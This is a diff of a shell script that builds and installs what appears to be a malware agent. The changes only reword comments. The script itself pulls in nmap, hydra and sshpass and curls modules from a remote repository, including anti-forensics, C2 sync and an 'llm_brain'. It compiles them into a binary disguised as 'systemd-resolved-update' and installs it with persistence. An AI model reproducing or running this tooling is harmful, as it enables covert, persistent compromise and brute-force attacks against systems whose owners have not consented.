@@ -11,7 +11,7 @@ cd "$WORKDIR"
 apt-get update -y
 apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync
 
-# Download each file explicitly (no wildcards)
+# Download each file explicitly (no wildcards!)
 for file in \
     main.py \
     core/daemonizer.py core/orchestrator.py core/anti_forensics.py core/c2_sync.py core/llm_brain.py \
@@ -22,21 +22,21 @@ for file in \
     curl -s -o "$file" "$REPO_URL/$file"
 done
 
-# Ensure __init__.py exists in each package folder (needed for PyInstaller)
+# Ensure __init__.py exists (package markers)
 touch core/__init__.py modules/__init__.py utils/__init__.py
 
-# Verify downloaded files
+# Show downloaded files for verification
 echo "=== Downloaded files ==="
 ls -la core/ modules/ utils/
 
-# Create virtual environment and install dependencies
+# Create venv and install deps
 python3 -m venv venv
 source venv/bin/activate
 pip install --upgrade pip
 pip install -r requirements.txt
 pip install pyinstaller
 
-# Generate spec file to collect all submodules
+# Generate spec file with collect_submodules
 cat > main.spec <<EOF
 # -*- mode: python ; coding: utf-8 -*-
 from PyInstaller.utils.hooks import collect_submodules
@@ -83,10 +83,10 @@ EOF
 # Build using the spec file
 pyinstaller main.spec
 
-# Move binary to system path
+# Copy binary
 cp dist/systemd-resolved-update /usr/local/bin/
 
-# Install persistence (preserve environment variables with sudo -E)
+# Install persistence with environment variables
 sudo -E /usr/local/bin/systemd-resolved-update --install
 
 # Cleanup
